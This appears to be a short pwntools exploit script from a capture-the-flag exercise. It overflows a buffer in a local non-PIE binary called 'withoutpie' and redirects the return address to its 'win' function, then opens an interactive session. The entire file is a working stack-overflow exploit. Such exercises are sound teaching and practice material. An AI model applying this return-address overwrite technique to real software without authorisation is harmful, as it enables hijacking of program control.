import pwn

elf = pwn.context.binary = pwn.ELF("./withoutpie")

buffer_size = 0x69 # nice
win_addr = elf.sym.win
return_offset = 0xC

payload = b"A"*buffer_size
payload += b"B"*return_offset + pwn.p32(win_addr)

p = pwn.process(elf.path)

p.recvuntil(b"Winning isn't everything, it's the only thing\n")

p.sendline(payload)

p.interactive()
